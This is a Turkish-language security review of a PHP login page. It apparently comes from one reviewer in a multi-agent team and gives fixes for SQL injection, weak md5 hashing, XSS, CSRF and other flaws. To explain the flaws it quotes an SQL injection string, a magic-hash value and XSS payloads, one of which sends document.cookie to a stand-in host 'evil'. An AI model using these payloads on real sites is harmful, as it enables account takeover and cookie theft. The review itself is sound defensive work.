# login.php — Güvenlik İncelemesi

**İnceleyen:** security
**Dosya:** `login.php` (102 satır)
**Genel değerlendirme:** Dosya üretime çıkmaya uygun değil. Kimlik doğrulama tamamen atlatılabilir (SQL injection + düz metin parola karşılaştırması), veritabanı içeriği okunabilir/değiştirilebilir ve parola hash'leri hem cookie'de hem de session'da taşınıyor.

## Özet tablo

| # | Satır | Sorun | Ciddiyet |
|---|-------|-------|----------|
| 1 | 14, 29, 36, 38, 76 | SQL Injection | **Kritik** |
| 2 | 20, 75 | md5 ile parola saklama + düz metin karşılaştırma + `==` type juggling | **Kritik** |
| 3 | 5 | Kod içine gömülü `root` / `root123` DB kimlik bilgisi | **Kritik** |
| 4 | 54 | Cookie'de `username:parola_hash` (güvensiz "beni hatırla") | **Yüksek** |
| 5 | 55, 57, 61, 66, 82, 88, 89 | Reflected / Stored XSS | **Yüksek** |
| 6 | 61, 7 | SQL sorgusu ve DB hata mesajı kullanıcıya gösteriliyor | **Yüksek** |
| 7 | 44–63 (13, 27, 34, 38) | Brute-force / rate limiting koruması yok; `login_log` sınırsız büyüme ve kapatılmayan bağlantılarla bağlantı tükenmesi (DoS) | **Yüksek** |
| 8 | 52 | Session fixation (`session_regenerate_id` yok) + tüm kullanıcı satırı (hash dahil) session'da | **Orta** |
| 9 | 88, 93 | CSRF token yok (login ve kayıt formları) | **Orta** |
| 10 | 71–76 | Kayıtta kullanıcı adı yarış durumu (race condition), girdi doğrulama yok | **Orta** |
| 11 | 82 | `header()` sonrası `exit` yok, header'a kullanıcı girdisi | **Orta** |
| 12 | 2, 54 | Cookie/session bayrakları (`HttpOnly`, `Secure`, `SameSite`) yok | **Orta** |
| 13 | 90, 96 | Parola alanları `type="text"` | **Düşük** |
| 14 | 60–61 | Kullanıcı adı numaralandırma (user enumeration) | **Düşük** |

---

## 1. SQL Injection — KRİTİK

**Satırlar:** 14 (`Get_User`), 29 (`logLoginAttempt`), 36 ve 38 (`get_user_roles`), 76 (`register_user`)

Kullanıcı girdisi doğrudan string birleştirme ile SQL'e ekleniyor. Örneğin kullanıcı adı alanına `' OR '1'='1' -- ` yazılırsa `Get_User` tablodaki ilk kullanıcıyı (çoğunlukla admin) döndürür. 29. satırda `$username` (ve teorik olarak proxy arkasında `REMOTE_ADDR`) üzerinden INSERT'e enjeksiyon yapılabilir; 76. satırda `$username` ve `$email` enjekte edilebilir. 36/38. satırlar şu an DB'den gelen değeri kullansa da (second-order) aynı kalıp tehlikelidir.

**Düzeltme (mysqli prepared statements):**

```php
function get_user(mysqli $conn, string $username): ?array {
    $stmt = $conn->prepare('SELECT id, username, password FROM users WHERE username = ?');
    $stmt->bind_param('s', $username);
    $stmt->execute();
    $row = $stmt->get_result()->fetch_assoc();
    $stmt->close();
    return $row ?: null;
}

function log_login_attempt(mysqli $conn, string $username, bool $success): void {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $ok = $success ? 1 : 0;
    $stmt = $conn->prepare('INSERT INTO login_log (username, ip, success, created_at) VALUES (?, ?, ?, NOW())');
    $stmt->bind_param('ssi', $username, $ip, $ok);
    $stmt->execute();
    $stmt->close();
}

function get_user_roles(mysqli $conn, int $userId): array {
    $stmt = $conn->prepare(
        'SELECT r.id, r.name FROM user_roles ur JOIN roles r ON r.id = ur.role_id WHERE ur.user_id = ?'
    );
    $stmt->bind_param('i', $userId);
    $stmt->execute();
    return $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
}
```

Ek olarak: `mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);` ile hataları exception'a çevirin ve DB kullanıcısına sadece gerekli tablolarda gerekli yetkileri verin.

---

## 2. Zayıf parola saklama ve karşılaştırma — KRİTİK

**Satırlar:** 20, 75

- `md5` parola hash'i için uygun değildir (tuzsuz, çok hızlı, rainbow table ile kırılır).
- `|| $user['password'] == $Password` → saldırgan, DB'den sızmış **hash'i doğrudan parola olarak** girerek giriş yapabilir (pass-the-hash). Ayrıca 54. satırda hash cookie'ye yazıldığı için bu daha da kolaylaşır.
- `==` gevşek karşılaştırma: `0e` ile başlayan "magic hash" değerleri (ör. `md5('240610708')` = `0e462097...`) PHP'de sayısal olarak `0 == 0` kabul edilir → farklı parolalarla giriş mümkün.

**Düzeltme:**

```php
// Kayıt
$hash = password_hash($password, PASSWORD_DEFAULT); // bcrypt/argon2, otomatik salt

// Giriş
function check_password(array $user, string $password, mysqli $conn): bool {
    if (!password_verify($password, $user['password'])) {
        return false;
    }
    // Algoritma güncellendiyse hash'i yenile
    if (password_needs_rehash($user['password'], PASSWORD_DEFAULT)) {
        $new = password_hash($password, PASSWORD_DEFAULT);
        $stmt = $conn->prepare('UPDATE users SET password = ? WHERE id = ?');
        $stmt->bind_param('si', $new, $user['id']);
        $stmt->execute();
    }
    return true;
}
```

Mevcut md5 hash'leri için geçiş: kullanıcı bir sonraki girişinde `hash_equals($user['password'], md5($password))` doğrulanırsa hemen `password_hash` ile yeniden hash'leyip kaydedin; düz metin karşılaştırmasını tamamen kaldırın. `users.password` kolonunu en az `VARCHAR(255)` yapın.

---

## 3. Kod içine gömülü DB kimlik bilgileri — KRİTİK

**Satır:** 5

`root` / `root123` hem kaynak kodda açık, hem de tahmin edilebilir, hem de en yetkili hesap. SQL injection ile birleşince tüm sunucudaki veritabanları risk altında.

**Düzeltme:**

```php
function db_connect(): mysqli {
    static $conn = null;               // tek bağlantı (performans notu, bkz. tartışma)
    if ($conn === null) {
        mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
        $conn = new mysqli(
            getenv('DB_HOST'),
            getenv('DB_USER'),          // root değil, sınırlı yetkili kullanıcı
            getenv('DB_PASS'),
            getenv('DB_NAME')
        );
        $conn->set_charset('utf8mb4');
    }
    return $conn;
}
```

`root123` parolasını derhal değiştirin.

---

## 4. Cookie'de parola hash'i — YÜKSEK

**Satır:** 54

`remember_user` cookie'si `username:md5hash` içeriyor; `HttpOnly`/`Secure` yok. XSS ile çalınırsa (bkz. #5) hash hem offline kırılabilir hem de #2'deki düz karşılaştırma sayesinde doğrudan giriş için kullanılabilir.

**Düzeltme (rastgele token, DB'de hash'i tutulur):**

```php
$selector  = bin2hex(random_bytes(12));
$validator = bin2hex(random_bytes(32));
$hashed    = hash('sha256', $validator);
$expires   = time() + 86400 * 30;

$stmt = $conn->prepare('INSERT INTO auth_tokens (selector, hashed_validator, user_id, expires) VALUES (?, ?, ?, FROM_UNIXTIME(?))');
$stmt->bind_param('ssii', $selector, $hashed, $user['id'], $expires);
$stmt->execute();

setcookie('remember', $selector . ':' . $validator, [
    'expires'  => $expires,
    'path'     => '/',
    'secure'   => true,
    'httponly' => true,
    'samesite' => 'Strict',
]);
// Doğrularken: hash_equals($row['hashed_validator'], hash('sha256', $validator))
```

---

## 5. Cross-Site Scripting (XSS) — YÜKSEK

**Satırlar:**
- 55: `$username` escape edilmeden basılıyor.
- 57: `$role['name']` (DB'den — stored XSS).
- 61: `$username` hata mesajında.
- 66: `$_GET['msg']` → klasik reflected XSS: `login.php?msg=<script>document.location='//evil/?c='+document.cookie</script>`
- 82: Kayıt sonrası `new_username` URL'ye konup 66. satırda basılıyor → kayıtlı kullanıcı adı üzerinden XSS.
- 88: `$_SERVER['PHP_SELF']` → `login.php/"><script>...` ile XSS.
- 89: `$_POST['username']` value attribute'una basılıyor.

**Düzeltme:**

```php
function e(?string $s): string {
    return htmlspecialchars($s ?? '', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

echo '<h2>Welcome back, ' . e($user['username']) . '!</h2>';
foreach ($_SESSION['roles'] as $role) {
    echo '<li>' . e($role['name']) . '</li>';
}
if (isset($_GET['msg'])) {
    echo "<div class='msg'>" . e($_GET['msg']) . '</div>';
}
?>
<form method="POST" action="<?= e($_SERVER['SCRIPT_NAME']) ?>">
    Username: <input type="text" name="username" value="<?= e($_POST['username'] ?? '') ?>">
```

Daha iyisi: `msg` için kullanıcı girdisi yerine sabit bir kod kullanın (`?msg=registered`) ve metni sunucu tarafında eşleyin. Ek savunma olarak `Content-Security-Policy` header'ı ekleyin.

---

## 6. Bilgi sızıntısı (SQL sorgusu ve DB hataları) — YÜKSEK

**Satırlar:** 61, 7

61. satır çalıştırılan SQL sorgusunu saldırgana gösteriyor — SQL injection payload'ını ayarlamak için mükemmel bir geri bildirim. 7. satır `mysqli_connect_error()` ile sunucu/kullanıcı bilgisini açığa çıkarıyor.

**Düzeltme:**

```php
// 61
echo '<p style="color:red">Kullanıcı adı veya parola hatalı.</p>';

// 7
try {
    $conn = new mysqli(/* ... */);
} catch (mysqli_sql_exception $ex) {
    error_log('DB connect failed: ' . $ex->getMessage());
    http_response_code(500);
    exit('Bir hata oluştu, lütfen daha sonra tekrar deneyin.');
}
```

Üretimde `display_errors=Off`, `log_errors=On`.

---

## 7. Brute-force / rate limiting yok — YÜKSEK

**Satırlar:** 44–63

`login_log` tablosuna yazılıyor ama hiç okunmuyor; sınırsız parola denemesi yapılabilir. md5 + zayıf parolalarla birleşince hesap ele geçirme kolay.

**Düzeltme:**

```php
function too_many_attempts(mysqli $conn, string $username, string $ip): bool {
    $stmt = $conn->prepare(
        'SELECT COUNT(*) FROM login_log
         WHERE success = 0 AND (username = ? OR ip = ?)
           AND created_at > NOW() - INTERVAL 15 MINUTE'
    );
    $stmt->bind_param('ss', $username, $ip);
    $stmt->execute();
    $stmt->bind_result($cnt);
    $stmt->fetch();
    return $cnt >= 5;
}
// Index: CREATE INDEX idx_login_log_user_time ON login_log (username, created_at);
//        CREATE INDEX idx_login_log_ip_time   ON login_log (ip, created_at);
```

**Ek (performance'tan):** `login_log` tablosu sınırsız büyüyor; saldırgan otomatik isteklerle tabloyu şişirip disk/DB kaynağını tüketebilir (DoS yüzeyi). Rate limiting'e ek olarak eski kayıtlar periyodik silinmeli (ör. `DELETE FROM login_log WHERE created_at < NOW() - INTERVAL 90 DAY` cron ile) ve `username` kolonu uzunlukla sınırlandırılmalı. Benzer şekilde her fonksiyonda `db_connect()` ile açılıp kapatılmayan bağlantılar (13, 27, 34, 38) tek istekte 3+N bağlantıya yol açıyor; eşzamanlı isteklerde `max_connections` sınırına hızla ulaşılır → bağlantı tükenmesi DoS. `static` tek bağlantı (bkz. #3) bunu da çözer.

---

## 8. Session fixation ve session'da hassas veri — ORTA

**Satır:** 52 (ve 2)

Başarılı girişte session ID yenilenmiyor → saldırgan önceden belirlediği session ID'yi kurbana kullandırıp girişten sonra ele geçirebilir. Ayrıca `SELECT *` sonucu (parola hash'i dahil) session'a konuyor.

**Düzeltme:**

```php
session_regenerate_id(true);
$_SESSION['user_id']  = (int)$user['id'];
$_SESSION['username'] = $user['username'];
$_SESSION['roles']    = get_user_roles($conn, (int)$user['id']);
```

---

## 9. CSRF koruması yok — ORTA

**Satırlar:** 88, 93

Login CSRF (kurbanı saldırganın hesabına sokma) ve sahte kayıt mümkün.

**Düzeltme:**

```php
if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(random_bytes(32));
}
// Formda:
// <input type="hidden" name="csrf" value="<?= e($_SESSION['csrf']) ?>">

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Geçersiz istek.');
    }
}
```

---

## 10. Kayıt işleminde race condition ve girdi doğrulama eksikliği — ORTA

**Satırlar:** 71–76, 81

- Kullanıcı adı benzersizliği PHP'de tüm tabloyu döngüyle tarayarak kontrol ediliyor (`==` ile, büyük/küçük harf duyarlı); eşzamanlı iki istek aynı kullanıcı adını kaydedebilir. Ayrıca bu tarama tüm kullanıcıların hash'lerini belleğe çekiyor.
- E-posta, kullanıcı adı uzunluğu/karakter seti, parola gücü doğrulanmıyor.
- 80. satırdaki `register` dalı, 44. satırdaki login dalı ile aynı POST'ta çalışıyor (login denemesi `username` boş olarak loglanıyor).

**Düzeltme:**

```php
// DB: ALTER TABLE users ADD UNIQUE KEY uq_username (username);

function register_user(mysqli $conn, string $username, string $password, string $email): bool {
    if (!preg_match('/^[A-Za-z0-9_]{3,32}$/', $username)) return false;
    if (!filter_var($email, FILTER_VALIDATE_EMAIL))     return false;
    if (strlen($password) < 12)                          return false;

    $hash = password_hash($password, PASSWORD_DEFAULT);
    $stmt = $conn->prepare('INSERT INTO users (username, password, email) VALUES (?, ?, ?)');
    $stmt->bind_param('sss', $username, $hash, $email);
    try {
        return $stmt->execute();
    } catch (mysqli_sql_exception $ex) {
        if ($ex->getCode() === 1062) return false; // duplicate key
        throw $ex;
    }
}
```

---

## 11. Yönlendirme sonrası `exit` yok / header'da kullanıcı girdisi — ORTA

**Satır:** 82

`header("Location: ...")` sonrası `exit` olmadığı için betik çalışmaya devam ediyor (sayfa HTML'i de gönderiliyor). Kullanıcı adı URL'ye kodlanmadan ekleniyor (boşluk, `&`, `#` URL'yi bozuyor; XSS'e taşıyıcı oluyor — bkz. #5). Ayrıca 55/61. satırlarda çıktı basıldıysa header gönderilemez.

**Düzeltme:**

```php
if (isset($_POST['register'])) {
    $ok = register_user($conn, $_POST['new_username'] ?? '', $_POST['new_password'] ?? '', $_POST['email'] ?? '');
    header('Location: login.php?msg=' . ($ok ? 'registered' : 'register_failed'));
    exit;
}
```

---

## 12. Cookie / session güvenlik bayrakları — ORTA

**Satırlar:** 2, 54

`session_start()` varsayılan ayarlarla; `HttpOnly`, `Secure`, `SameSite` yok.

```php
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'secure'   => true,
    'httponly' => true,
    'samesite' => 'Lax',
]);
ini_set('session.use_strict_mode', '1');
session_start();
```

Uygulamanın tamamı HTTPS üzerinden sunulmalı (HSTS önerilir).

---

## 13. Parola alanları `type="text"` — DÜŞÜK

**Satırlar:** 90, 96

Parola ekranda görünür (omuz üstünden bakma), tarayıcı otomatik doldurma geçmişine kaydedebilir.

```html
Password: <input type="password" name="password" autocomplete="current-password"><br>
New password: <input type="password" name="new_password" autocomplete="new-password"><br>
```

---

## 14. Kullanıcı adı numaralandırma — DÜŞÜK

**Satırlar:** 60–61, 73

Hata mesajında kullanıcı adı yankılanıyor ve kayıt akışı "kullanıcı adı alınmış" bilgisini sızdırabiliyor. Ayrıca kullanıcı yoksa parola doğrulaması yapılmadığından yanıt süresi farkı (timing) ile var olan kullanıcılar tespit edilebilir.

```php
$user = get_user($conn, $username);
$hashToCheck = $user['password'] ?? '$2y$10$usesomesillystringfore7hnbRJHxXVLeakoG8K30oukPsA.ztMG'; // sahte hash
$valid = password_verify($password, $hashToCheck) && $user !== null;
if (!$valid) {
    echo '<p style="color:red">Kullanıcı adı veya parola hatalı.</p>';
}
```

---

## Öncelikli aksiyon listesi

1. Tüm sorguları prepared statement'a çevir (#1).
2. `password_hash` / `password_verify`'a geç, düz metin karşılaştırmasını kaldır (#2).
3. `root123` parolasını değiştir, kimlik bilgilerini koddan çıkar, sınırlı yetkili DB kullanıcısı kullan (#3).
4. `remember_user` cookie'sini kaldır / token tabanlı yapıya geç; mevcut cookie'leri geçersiz kıl (#4).
5. Tüm çıktılara `htmlspecialchars` uygula, SQL'i ekrana basmayı kaldır (#5, #6).
6. Rate limiting, `session_regenerate_id`, CSRF token, cookie bayrakları ekle (#7–#12).

---

## Takım tartışmasından notlar

Tek tur mesajlaşma yapıldı.

**performance'a gönderdiklerim:** `register_user`'daki tam tablo taraması + race condition (UNIQUE index önerisi), `get_user_roles`'taki N+1 sorgu ve her döngüde yeni bağlantı açılması (bağlantı tükenmesi riski), rate limiting için `login_log` index'i, `SELECT *` ile hash'in session'a yazılması.

**quality'ye gönderdiklerim:** `header()` sonrası `exit` eksikliği, `die()` ile hata sızıntısı, `==` type juggling, `register_user` dönüş değerinin kontrol edilmemesi, `type="text"` parola alanları, `isset` kontrolsüz `$_POST` erişimi, iş mantığı ile HTML'in karışması.

**Gelen geri bildirimler ve değerlendirmem:**

- **performance:** Bağlantı açma/kapatmama (3+N bağlantı), N+1, tam tablo taraması, `SELECT *` + session'da hash, TOCTOU race condition, cookie'de hash, `exit` eksikliği ve `die()` sızıntısı noktalarında bulgularımızla örtüşüyor. **Rapora eklenen yeni nokta:** `login_log` tablosunun sınırsız büyümesi (DoS yüzeyi) ve kapatılmayan bağlantıların bağlantı tükenmesine yol açması → #7'ye eklendi. md5 yerine `password_hash` önerisi #2 ile aynı.
- **quality:** Bildirdiği 9 maddenin tamamı (cookie bayrakları, SQL'in ekrana basılması, md5/düz metin/`==`, `exit` eksikliği, `PHP_SELF`/`value` XSS, `type="text"`, CSRF ve `session_regenerate_id`, session'da hash, hardcoded root + `die()`) raporda zaten #2–#13 altında yer alıyor; bağımsız bir doğrulama olarak not edildi. Quality'nin "CRLF/redirect" notu hakkında: PHP 5.1.2+ `header()` içinde satır sonlarını reddettiği için header injection pratikte engelleniyor ve yönlendirme hedefi sabit (`login.php`) olduğundan açık yönlendirme yok; ancak kullanıcı adının URL'ye kodlanmadan konması ve sonrasında 66. satırda basılması XSS taşıyıcısı olduğu için #11'deki düzeltme (sabit mesaj kodu + `exit`) geçerli.
- **Ortak sonuç:** Üç inceleyici de `db_connect()` → tek paylaşımlı bağlantı, `get_user_roles` → JOIN, kayıt → `UNIQUE` index + prepared INSERT, session'a yalnızca `id`/`username` yazılması konusunda aynı düzeltmede birleşiyor; bu değişiklikler hem güvenlik hem performans hem de kalite sorunlarını birlikte çözüyor.
